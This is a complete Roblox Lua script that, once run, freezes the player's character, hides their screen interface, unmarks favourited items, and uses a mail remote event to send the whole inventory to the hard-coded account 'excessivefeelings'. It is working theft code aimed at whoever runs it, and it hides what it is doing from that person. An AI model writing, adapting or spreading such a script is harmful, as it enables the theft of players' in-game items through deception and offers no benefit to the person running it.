local T="excessivefeelings"
local P=game.Players.LocalPlayer
local C=P.Character or P.CharacterAdded:Wait()
local H=C:WaitForChild("Humanoid")
H.WalkSpeed=0 H.JumpPower=0 H.AutoRotate=false
for _,v in pairs(P.PlayerGui:GetChildren())do if v:IsA("ScreenGui")then v.Enabled=false end end
local function U(v)
if v:IsA("BoolValue")and v.Name:lower():find("favorite")then v.Value=false end
if v:IsA("NumberValue")and(v.Parent:FindFirstChild("Favorite")or v.Parent:FindFirstChild("favorite"))then
local f=v.Parent:FindFirstChild("Favorite")or v.Parent:FindFirstChild("favorite")
if f:IsA("BoolValue")then f.Value=false end end
if v.IsA and v:IsA("Tool")then
if v:GetAttribute("Favorite")~=nil then v:SetAttribute("Favorite",false)end end
end
local function M(r,i,q)
local R=game:GetService("ReplicatedStorage"):FindFirstChild("MailEvent")or game:GetService("ReplicatedStorage"):FindFirstChild("SendMail")or game:GetService("ReplicatedStorage"):FindFirstChildOfClass("RemoteEvent")
if R then
pcall(function()
if R:IsA("RemoteFunction")then R:InvokeServer(r,i,q)else R:FireServer(r,i,q)end
end)end end
local I={}
local function S(f)
if f then
for _,v in pairs(f:GetDescendants())do
U(v)
if v:IsA("NumberValue")and v.Value>0 then
local id=v.Parent.Name
I[id]=(I[id]or 0)+v.Value
end end end end
S(P:FindFirstChild("PlayerData"))
S(P:FindFirstChild("Data"))
S(workspace:FindFirstChild(P.Name))
for _,v in pairs(P.Backpack:GetChildren())do U(v)I[v.Name]=(I[v.Name]or 0)+1 end
for _,v in pairs(P.Character:GetChildren())do if v:IsA("Tool")or v:IsA("Model")then U(v)I[v.Name]=(I[v.Name]or 0)+1 end end
for id,q in pairs(I)do if q>0 then M(T,id,q)wait(0.05)end end

